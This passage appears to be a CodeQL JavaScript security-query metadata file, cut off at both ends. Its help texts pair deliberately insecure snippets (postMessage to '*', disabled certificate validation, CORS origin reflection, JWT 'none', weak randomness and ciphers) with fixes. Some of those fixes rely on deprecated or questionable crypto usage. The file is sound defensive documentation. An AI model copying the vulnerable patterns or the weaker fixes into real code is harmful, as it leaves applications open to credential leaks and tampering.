    app.use("bootstrap", express.static('./node_modules/bootstrap/dist'));
    ```

    ## References
    * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
    * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
    * Common Weakness Enumeration: [CWE-219](https://cwe.mitre.org/data/definitions/219.html).
    * Common Weakness Enumeration: [CWE-548](https://cwe.mitre.org/data/definitions/548.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-201/PostMessageStar.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-201/PostMessageStar.bqrs
  metadata:
    name: Cross-window communication with unrestricted target origin
    description: |-
      When sending sensitive information to another window using `postMessage`,
                    the origin of the target window should be restricted to avoid unintentional
                    information leaks.
    kind: path-problem
    problem.severity: error
    security-severity: 4.3
    precision: high
    id: js/cross-window-information-leak
    tags: |-
      security
             external/cwe/cwe-201
             external/cwe/cwe-359
  queryHelp: |
    # Cross-window communication with unrestricted target origin
    The `window.postMessage` method allows different windows or iframes to communicate directly, even if they were loaded from different origins, circumventing the usual same-origin policy.

    The sender of the message can restrict the origin of the receiver by specifying a target origin. If the receiver window does not come from this origin, the message is not sent.

    Alternatively, the sender can specify a target origin of `'*'`, which means that any origin is acceptable and the message is always sent.

    This feature should not be used if the message being sent contains sensitive data such as user credentials: the target window may have been loaded from a malicious site, to which the data would then become available.


    ## Recommendation
    If possible, specify a target origin when using `window.postMessage`. Alternatively, encrypt the sensitive data before sending it to prevent an unauthorized receiver from accessing it.


    ## Example
    The following example code sends user credentials (in this case, their user name) to `window.parent` without checking its origin. If a malicious site loads the page containing this code into an iframe it would be able to gain access to the user name.


    ```javascript
    window.parent.postMessage(userName, '*');

    ```
    To prevent this from happening, the origin of the target window should be restricted, as in this example:


    ```javascript
    window.parent.postMessage(userName, 'https://github.com');

    ```

    ## References
    * Mozilla Developer Network: [Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
    * Mozilla Developer Network: [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).
    * Common Weakness Enumeration: [CWE-201](https://cwe.mitre.org/data/definitions/201.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-209/StackTraceExposure.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-209/StackTraceExposure.bqrs
  metadata:
    name: Information exposure through a stack trace
    description: |-
      Propagating stack trace information to an external user can
                    unintentionally reveal implementation details that are useful
                    to an attacker for developing a subsequent exploit.
    kind: path-problem
    problem.severity: warning
    security-severity: 5.4
    precision: very-high
    id: js/stack-trace-exposure
    tags: |-
      security
             external/cwe/cwe-209
             external/cwe/cwe-497
  queryHelp: |
    # Information exposure through a stack trace
    Software developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.

    Unfortunately, the same information can be useful to an attacker. The sequence of function names in a stack trace can reveal the structure of the application as well as any internal components it relies on. Furthermore, the error message at the top of a stack trace can include information such as server-side file names and SQL code that the application relies on, allowing an attacker to fine-tune a subsequent injection attack.


    ## Recommendation
    Send the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.


    ## Example
    In the following example, an exception is caught and its stack trace is sent back to the remote user as part of the HTTP response. As such, the user is able to see a detailed stack trace, which may contain sensitive information.


    ```javascript
    var http = require('http');

    http.createServer(function onRequest(req, res) {
      var body;
      try {
        body = handleRequest(req);
      }
      catch (err) {
        res.statusCode = 500;
        res.setHeader("Content-Type", "text/plain");
        res.end(err.stack); // NOT OK
        return;
      }
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Length", body.length);
      res.end(body);
    }).listen(3000);

    ```
    Instead, the stack trace should be logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information:


    ```javascript
    var http = require('http');

    http.createServer(function onRequest(req, res) {
      var body;
      try {
        body = handleRequest(req);
      }
      catch (err) {
        res.statusCode = 500;
        res.setHeader("Content-Type", "text/plain");
        log("Exception occurred", err.stack);
        res.end("An exception occurred"); // OK
        return;
      }
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/json");
      res.setHeader("Content-Length", body.length);
      res.end(body);
    }).listen(3000);

    ```

    ## References
    * OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).
    * Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).
    * Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-295/DisablingCertificateValidation.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-295/DisablingCertificateValidation.bqrs
  metadata:
    name: Disabling certificate validation
    description: Disabling cryptographic certificate validation can cause security
      vulnerabilities.
    kind: problem
    problem.severity: error
    security-severity: 7.5
    precision: very-high
    id: js/disabling-certificate-validation
    tags: |-
      security
             external/cwe/cwe-295
             external/cwe/cwe-297
  queryHelp: |
    # Disabling certificate validation
    Certificate validation is the standard authentication method of a secure TLS connection. Without it, there is no guarantee about who the other party of a TLS connection is, making man-in-the-middle attacks more likely to occur

    When testing software that uses TLS connections, it may be useful to disable the certificate validation temporarily. But disabling it in production environments is strongly discouraged, unless an alternative method of authentication is used.


    ## Recommendation
    Do not disable certificate validation for TLS connections.


    ## Example
    The following example shows a HTTPS connection that transfers confidential information to a remote server. But the connection is not secure since the `rejectUnauthorized` option of the connection is set to `false`. As a consequence, anyone can impersonate the remote server, and receive the confidential information.


    ```javascript
    let https = require("https");

    https.request(
      {
        hostname: "secure.my-online-bank.com",
        port: 443,
        method: "POST",
        path: "send-confidential-information",
        rejectUnauthorized: false // BAD
      },
      response => {
        // ... communicate with secure.my-online-bank.com
      }
    );

    ```
    To make the connection secure, the `rejectUnauthorized` option should have its default value, or be explicitly set to `true`.


    ## References
    * Wikipedia: [Transport Layer Security (TLS)](https://en.wikipedia.org/wiki/Transport_Layer_Security)
    * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Node.js: [TLS (SSL)](https://nodejs.org/api/tls.html)
    * Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).
    * Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-300/InsecureDependencyResolution.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-300/InsecureDependencyResolution.bqrs
  metadata:
    name: Dependency download using unencrypted communication channel
    description: |-
      Using unencrypted protocols to fetch dependencies can leave an application
                    open to man-in-the-middle attacks.
    kind: problem
    problem.severity: warning
    security-severity: 8.1
    precision: high
    id: js/insecure-dependency
    tags: |-
      security
             external/cwe/cwe-300
             external/cwe/cwe-319
             external/cwe/cwe-494
             external/cwe/cwe-829
  queryHelp: |
    # Dependency download using unencrypted communication channel
    Using an insecure protocol like HTTP or FTP to download build dependencies makes the build process vulnerable to a man-in-the-middle (MITM) attack.

    This can allow attackers to inject malicious code into the downloaded dependencies, and thereby infect the build artifacts and execute arbitrary code on the machine building the artifacts.


    ## Recommendation
    Always use a secure protocol, such as HTTPS or SFTP, when downloading artifacts from an URL.


    ## Example
    The below example shows a `package.json` file that downloads a dependency using the insecure HTTP protocol.


    ```json
    {
      "name": "example-project",
      "dependencies": {
        "unencrypted": "http://example.org/foo/tarball/release/0.0.1",
        "lodash": "^4.0.0"
      }
    }
    ```
    The fix is to change the protocol to HTTPS.


    ```json
    {
      "name": "example-project",
      "dependencies": {
        "unencrypted": "https://example.org/foo/tarball/release/0.0.1",
        "lodash": "^4.0.0"
      }
    }
    ```

    ## References
    * Jonathan Leitschuh: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://infosecwriteups.com/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb)
    * Max Veytsman: [ How to take over the computer of any Java (or Closure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)
    * Wikipedia: [Supply chain attack.](https://en.wikipedia.org/wiki/Supply_chain_attack)
    * Wikipedia: [Man-in-the-middle attack.](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).
    * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
    * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
    * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/BuildArtifactLeak.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/BuildArtifactLeak.bqrs
  metadata:
    name: Storage of sensitive information in build artifact
    description: |-
      Including sensitive information in a build artifact can
                    expose it to an attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/build-artifact-leak
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-315
             external/cwe/cwe-359
  queryHelp: |
    # Storage of sensitive information in build artifact
    Sensitive information included in a build artifact can allow an attacker to access the sensitive information if the artifact is published.


    ## Recommendation
    Only store information that is meant to be publicly available in a build artifact.


    ## Example
    The following example creates a `webpack` configuration that inserts all environment variables from the host into the build artifact:


    ```javascript
    const webpack = require("webpack");

    module.exports = [{
        plugins: [
            new webpack.DefinePlugin({
                "process.env": JSON.stringify(process.env)
            })
        ]
    }];
    ```
    The environment variables might include API keys or other sensitive information, and the build-system should instead insert only the environment variables that are supposed to be public.

    The issue has been fixed below, where only the `DEBUG` environment variable is inserted into the artifact.


    ```javascript
    const webpack = require("webpack");

    module.exports = [{
        plugins: [
            new webpack.DefinePlugin({
                'process.env': JSON.stringify({ DEBUG: process.env.DEBUG })
            })
        ]
    }];

    ```

    ## References
    * webpack: [DefinePlugin API](https://webpack.js.org/plugins/define-plugin/).
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/CleartextLogging.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextLogging.bqrs
  metadata:
    name: Clear-text logging of sensitive information
    description: |-
      Logging sensitive information without encryption or hashing can
                    expose it to an attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/clear-text-logging
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-359
             external/cwe/cwe-532
  queryHelp: "# Clear-text logging of sensitive information\nIf sensitive data is\
    \ written to a log entry it could be exposed to an attacker who gains access to\
    \ the logs.\n\nPotential attackers can obtain sensitive user data when the log\
    \ output is displayed. Additionally that data may expose system information such\
    \ as full path names, system information, and sometimes usernames and passwords.\n\
    \n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\n\
    In the example the entire process environment is logged using \\`console.info\\\
    `. Regular users of the production deployed application should not have access\
    \ to this much information about the environment configuration.\n\n\n```javascript\n\
    // BAD: Logging cleartext sensitive data\nconsole.info(`[INFO] Environment: ${JSON.stringify(process.env)}`);\n\
    \n```\nIn the second example the data that is logged is not sensitive.\n\n\n```javascript\n\
    let not_sensitive_data = { a: 1, b : 2} \n// GOOD: it is fine to log data that\
    \ is not sensitive\nconsole.info(`[INFO] Some object contains: ${JSON.stringify(not_sensitive_data)}`);\n\
    ```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n\
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n\
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n\
    * Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/CleartextStorage.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextStorage.bqrs
  metadata:
    name: Clear text storage of sensitive information
    description: |-
      Sensitive information stored without encryption or hashing can expose it to an
                    attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/clear-text-storage-of-sensitive-data
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-315
             external/cwe/cwe-359
  queryHelp: |
    # Clear text storage of sensitive information
    Sensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage. This is particularly important for cookies, which are stored on the machine of the end-user.


    ## Recommendation
    Ensure that sensitive information is always encrypted before being stored. If possible, avoid placing sensitive information in cookies altogether. Instead, prefer storing, in the cookie, a key that can be used to look up the sensitive information.

    In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.

    Be aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.


    ## Example
    The following example code stores user credentials (in this case, their password) in a cookie in plain text:


    ```javascript
    var express = require('express');

    var app = express();
    app.get('/remember-password', function (req, res) {
      let pw = req.param("current_password");
      // BAD: Setting a cookie value with cleartext sensitive data.
      res.cookie("password", pw);
    });

    ```
    Instead, the credentials should be encrypted, for instance by using the Node.js `crypto` module:


    ```javascript
    var express = require('express');
    var crypto = require('crypto'),
        password = getPassword();

    function encrypt(text){
      var cipher = crypto.createCipher('aes-256-ctr', password);
      return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
    }

    var app = express();
    app.get('/remember-password', function (req, res) {
      let pw = req.param("current_password");
      // GOOD: Encoding the value before setting it.
      res.cookie("password", encrypt(pw));
    });

    ```

    ## References
    * M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.
    * M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-326/InsufficientKeySize.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-326/InsufficientKeySize.bqrs
  metadata:
    name: Use of a weak cryptographic key
    description: Using a weak cryptographic key can allow an attacker to compromise
      security.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/insufficient-key-size
    tags: |-
      security
             external/cwe/cwe-326
  queryHelp: |
    # Use of a weak cryptographic key
    Modern encryption relies on it being computationally infeasible to break the cipher and decode a message without the key. As computational power increases, the ability to break ciphers grows and keys need to become larger.


    ## Recommendation
    An encryption key should be at least 2048-bit long when using RSA encryption, and 128-bit long when using symmetric encryption.


    ## References
    * Wikipedia: [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).
    * Wikipedia: [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard).
    * NodeJS: [Crypto](https://nodejs.org/api/crypto.html).
    * NIST: [ Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
    * Wikipedia: [Key size](https://en.wikipedia.org/wiki/Key_size)
    * Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-327/BadRandomness.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BadRandomness.bqrs
  metadata:
    name: Creating biased random numbers from a cryptographically secure source
    description: |-
      Some mathematical operations on random numbers can cause bias in
                    the results and compromise security.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/biased-cryptographic-random
    tags: |-
      security
             external/cwe/cwe-327
  queryHelp: |
    # Creating biased random numbers from a cryptographically secure source
    Generating secure random numbers can be an important part of creating a secure software system. This can be done using APIs that create cryptographically secure random numbers.

    However, using some mathematical operations on these cryptographically secure random numbers can create biased results, where some outcomes are more likely than others. Such biased results can make it easier for an attacker to guess the random numbers, and thereby break the security of the software system.


    ## Recommendation
    Be very careful not to introduce bias when performing mathematical operations on cryptographically secure random numbers.

    If possible, avoid performing mathematical operations on cryptographically secure random numbers at all, and use a preexisting library instead.


    ## Example
    The example below uses the modulo operator to create an array of 10 random digits using random bytes as the source for randomness.


    ```javascript
    const crypto = require('crypto');

    const digits = [];
    for (let i = 0; i < 10; i++) {
        digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK
    }
    ```
    The random byte is a uniformly random value between 0 and 255, and thus the result from using the modulo operator is slightly more likely to be between 0 and 5 than between 6 and 9.

    The issue has been fixed in the code below by using a library that correctly generates cryptographically secure random values.


    ```javascript
    const cryptoRandomString = require('crypto-random-string');

    const digits = cryptoRandomString({length: 10, type: 'numeric'});
    ```
    Alternatively, the issue can be fixed by fixing the math in the original code. In the code below the random byte is discarded if the value is greater than or equal to 250. Thus the modulo operator is used on a uniformly random number between 0 and 249, which results in a uniformly random digit between 0 and 9.


    ```javascript
    const crypto = require('crypto');

    const digits = [];
    while (digits.length < 10) {
        const byte = crypto.randomBytes(1)[0];
        if (byte >= 250) {
            continue;
        }
        digits.push(byte % 10); // OK
    }
    ```

    ## References
    * Stack Overflow: [Understanding “randomness”](https://stackoverflow.com/questions/3956478/understanding-randomness).
    * OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).
    * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
    * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-327/BrokenCryptoAlgorithm.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BrokenCryptoAlgorithm.bqrs
  metadata:
    name: Use of a broken or weak cryptographic algorithm
    description: Using broken or weak cryptographic algorithms can compromise security.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/weak-cryptographic-algorithm
    tags: |-
      security
             external/cwe/cwe-327
             external/cwe/cwe-328
  queryHelp: |
    # Use of a broken or weak cryptographic algorithm
    Using broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.

    Many cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.


    ## Recommendation
    Ensure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048 for encryption, and SHA-2 or SHA-3 for secure hashing.


    ## Example
    The following code shows an example of using the builtin cryptographic library of NodeJS to encrypt some secret data. When creating a `Cipher` instance to encrypt the secret data with, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.


    ```javascript
    const crypto = require('crypto');

    var secretText = obj.getSecretText();

    const desCipher = crypto.createCipher('des', key);
    let desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption

    const aesCipher = crypto.createCipher('aes-128', key);
    let aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex'); // GOOD: strong encryption

    ```

    ## References
    * NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).
    * NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
    * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
    * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
    * Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-338/InsecureRandomness.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-338/InsecureRandomness.bqrs
  metadata:
    name: Insecure randomness
    description: |-
      Using a cryptographically weak pseudo-random number generator to generate a
                    security-sensitive value may allow an attacker to predict what value will
                    be generated.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/insecure-randomness
    tags: |-
      security
             external/cwe/cwe-338
  queryHelp: "# Insecure randomness\nUsing a cryptographically weak pseudo-random\
    \ number generator to generate a security-sensitive value, such as a password,\
    \ makes it easier for an attacker to predict the value.\n\nPseudo-random number\
    \ generators generate a sequence of numbers that only approximates the properties\
    \ of random numbers. The sequence is not truly random because it is completely\
    \ determined by a relatively small set of initial values, the seed. If the random\
    \ number generator is cryptographically weak, then this sequence may be easily\
    \ predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically\
    \ secure pseudo-random number generator if the output is to be used in a security-sensitive\
    \ context. As a rule of thumb, a value should be considered \"security-sensitive\"\
    \ if predicting it would allow the attacker to perform an action that they would\
    \ otherwise be unable to perform. For example, if an attacker could predict the\
    \ random password generated for a new user, they would be able to log in as that\
    \ new user.\n\nFor JavaScript on the NodeJS platform, `crypto.getRandomBytes`\
    \ provides a cryptographically secure pseudo-random byte generator. Note that\
    \ the conversion from bytes to numbers can introduce bias that breaks the security.\n\
    \nFor JavaScript in the browser, `crypto.getRandomValues` provides a cryptographically\
    \ secure pseudo-random number generator.\n\n\n## Example\nThe following examples\
    \ show different ways of generating a password.\n\nIn the first case, we generate\
    \ a fresh password by appending a random integer to the end of a static string.\
    \ The random number generator used (`Math.random`) is not cryptographically secure,\
    \ so it may be possible for an attacker to predict the generated password.\n\n\
    \n```javascript\nfunction insecurePassword() {\n    // BAD: the random suffix\
    \ is not cryptographically secure\n    var suffix = Math.random();\n    var password\
    \ = \"myPassword\" + suffix;\n    return password;\n}\n\n```\nIn the second example,\
    \ a cryptographically secure random number generator is used for the same purpose.\
    \ In this case, it is much harder to predict the generated integers.\n\n\n```javascript\n\
    function securePassword() {\n    // GOOD: the random suffix is cryptographically\
    \ secure\n    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];\n\
    \    var password = \"myPassword\" + suffix;\n    \n    // GOOD: if a random value\
    \ between 0 and 1 is desired\n    var secret = window.crypto.getRandomValues(new\
    \ Uint32Array(1))[0] * Math.pow(2,-32);\n}\n\n```\n\n## References\n* Wikipedia:\
    \ [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n\
    * Mozilla Developer Network: [Crypto: getRandomValues()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues).\n\
    * NodeJS: [crypto.randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)\n\
    * Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-346/CorsMisconfigurationForCredentials.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-346/CorsMisconfigurationForCredentials.bqrs
  metadata:
    name: CORS misconfiguration for credentials transfer
    description: Misconfiguration of CORS HTTP headers allows for leaks of secret
      credentials.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/cors-misconfiguration-for-credentials
    tags: |-
      security
             external/cwe/cwe-346
             external/cwe/cwe-639
             external/cwe/cwe-942
  queryHelp: |
    # CORS misconfiguration for credentials transfer
    A server can send the `"Access-Control-Allow-Credentials"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.

    When the `Access-Control-Allow-Credentials` header is `"true"`, the `Access-Control-Allow-Origin` header must have a value different from `"*"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `"Access-Control-Allow-Origin"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.


    ## Recommendation
    When the `Access-Control-Allow-Credentials` header value is `"true"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.

    Since the `"null"` origin is easy to obtain for an attacker, it is never safe to use `"null"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `"true"`.


    ## Example
    In the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.


    ```javascript
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function(){});

    server.on('request', function(req, res) {
        let origin = url.parse(req.url, true).query.origin;
         // BAD: attacker can choose the value of origin
        res.setHeader("Access-Control-Allow-Origin", origin);
        res.setHeader("Access-Control-Allow-Credentials", true);

        // ...
    });

    ```
    This is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:


    ```javascript
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function(){});

    server.on('request', function(req, res) {
        let origin = url.parse(req.url, true).query.origin,
            whitelist = {
                "https://example.com": true,
                "https://subdomain.example.com": true,
                "https://example.com:1337": true
            };

        if (origin in whitelist) {
            // GOOD: the origin is in the whitelist
            res.setHeader("Access-Control-Allow-Origin", origin);
            res.setHeader("Access-Control-Allow-Credentials", true);
        }

        // ...
    });

    ```

    ## References
    * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
    * Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).
    * PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
    * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)
    * Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).
    * Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).
    * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-347/MissingJWTKeyVerification.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-347/MissingJWTKeyVerification.bqrs
  metadata:
    name: JWT missing secret or public key verification
    description: The application does not verify the JWT payload with a cryptographic
      secret or public key.
    kind: problem
    problem.severity: warning
    security-severity: 7.0
    precision: high
    id: js/jwt-missing-verification
    tags: |-
      security
             external/cwe/cwe-347
  queryHelp: "# JWT missing secret or public key verification\nApplications decoding\
    \ JSON Web Tokens (JWT) may be misconfigured due to the `None` algorithm.\n\n\
    The `None` algorithm is selected by calling the `verify()` function with a falsy\
    \ value instead of a cryptographic secret or key. The `None` algorithm disables\
    \ the integrity enforcement of a JWT payload and may allow a malicious actor to\
    \ make unintended changes to a JWT payload leading to critical security issues\
    \ like privilege escalation.\n\n\n## Recommendation\nCalls to `verify()` functions\
    \ should use a cryptographic secret or key to decode JWT payloads.\n\n\n## Example\n\
    In the example below, `false` is used to disable the integrity enforcement of\
    \ a JWT payload. This may allow a malicious actor to make changes to a JWT payload.\n\
    \n\n```javascript\nconst jwt = require(\"jsonwebtoken\");\n\nconst secret = \"\
    my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' }, secret, { algorithm:\
    \ \"none\" })\njwt.verify(token, false, { algorithms: [\"HS256\", \"none\"] })\n\
    ```\nThe following code fixes the problem by using a cryptographic secret or key\
    \ to decode JWT payloads.\n\n\n```javascript\n\nconst jwt = require(\"jsonwebtoken\"\
    );\n\nconst secret = \"my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' },\
    \ secret, { algorithm: \"HS256\" }) \njwt.verify(token, secret, { algorithms:\
    \ [\"HS256\", \"none\"] })\n```\n\n## References\n* Auth0 Blog: [Meet the \"None\"\
    \ Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Meet-the--None--Algorithm).\n\
    * Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-352/MissingCsrfMiddleware.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-352/MissingCsrfMiddleware.bqrs
  metadata:
    name: Missing CSRF middleware
    description: |-
      Using cookies without CSRF protection may allow malicious websites to
                    submit requests on behalf of the user.
    kind: problem
    problem.severity: error
    security-severity: 8.8
    precision: high
    id: js/missing-token-validation
    tags: |-
      security
             external/cwe/cwe-352
  queryHelp: |
    # Missing CSRF middleware
    Websites that rely on cookie-based authentication may be vulnerable to cross-site request forgery (CSRF). Specifically, a state-changing request should include a secret token so the request can't be forged by an attacker. Otherwise, unwanted requests can be submitted on behalf of a user who visits a malicious website.

    This is typically mitigated by embedding a session-specific secret token in each request. This token is then checked as an additional authentication measure. A malicious website should have no way of guessing the correct token to embed in the request.


    ## Recommendation
